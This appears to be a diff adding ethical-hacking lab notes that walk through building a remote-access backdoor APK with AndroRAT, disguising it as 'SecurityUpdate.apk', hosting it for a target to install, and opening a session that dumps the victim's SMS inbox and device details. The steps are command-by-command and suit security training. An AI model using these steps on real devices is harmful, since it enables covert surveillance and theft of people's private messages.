@@ -57,3 +57,31 @@ Usually, developers connect to ADB on Android devices by using a USB cable, but 
 
 For demonstration purposes, in this task, we are exploiting the Android emulator machine. However, in real life, attackers use the Shodan search engine to find ADB-enabled devices and exploit them to gain sensitive information and carry out malicious activities.
 ==================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
+
+# Hack an Android Device by Creating APK File using AndroRAT
+-------------------------------------------------------------
+AndroRAT is a tool designed to give control of an Android system to a remote user and to retrieve information from it. AndroRAT is a client/server application developed in Java Android for the client side and the Server is in Python. AndroRAT provides a fully persistent backdoor to the target device as the app starts automatically on device boot up, it also obtains the current location, sim card details, IP address and MAC address of the device.
+>>> PARROT MACHINE [ATTACKER/10.10.1.13]
+1. sudo su >> cd AndroRAT   
+2. python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk   (to create an APK file (here, SecurityUpdate.apk)  is generated at the location /home/attacker/AndroRAT/.)
+  > --build: is used for building the APK
+  > -i: specifies the local IP address (here, 10.10.1.13)
+  > -p: specifies the port number (here, 4444)
+  > -o: specifies the output APK file (here, SecurityUpdate.apk)
+3. mkdir /var/www/html/share   >>   chmod -R 755 /var/www/html/share   >>  chown -R www-data:www-data /var/www/html/share  >>  service apache2 start
+4. cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/
+5. python3 androRAT.py --shell -i 0.0.0.0 -p 4444   (to start listening to the victim's machine and AndroRAT starts waiting for a connection)
+  > --shell: is used for getting the interpreter
+  > -i: specifies the IP address for listening (here, 0.0.0.0)
+  > -p: specifies the port number (here, 4444)
+>>> ANDROID MACHINE [TARGET/10.10.1.14]
+6. open chrome >> http://10.10.1.13/share  >> DOWNLOAD, INSTALL and OPEN the malicious apk file (SecurityUpdate.apk)
+>>> PARROT MACHINE [ATTACKER/10.10.1.13]
+7. Interpreter:/>                                  (Interpreter session has been opened successfully)
+  > help    (view the available commands in the opened session, try all commands)
+  > deviceInfo (view the device related information)
+  > getSMS inbox   (to obtain a file containing SMSes from the inbox of a victim device, file is stored at the location /home/attacker/AndroRAT/Dumps)
+  > getMACAddress  (view the MAC address of the victim's device)
+  > exit   (terminate the Interpreter session)
+==================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
+You can also use other Android hacking tools such as NetCut (https://www.arcai.com), drozer (https://labs.f-secure.com), zANTI (https://www.zimperium.com), Network Spoofer (https://www.digitalsquid.co.uk), and DroidSheep (https://droidsheep.info) to hack Android devices.
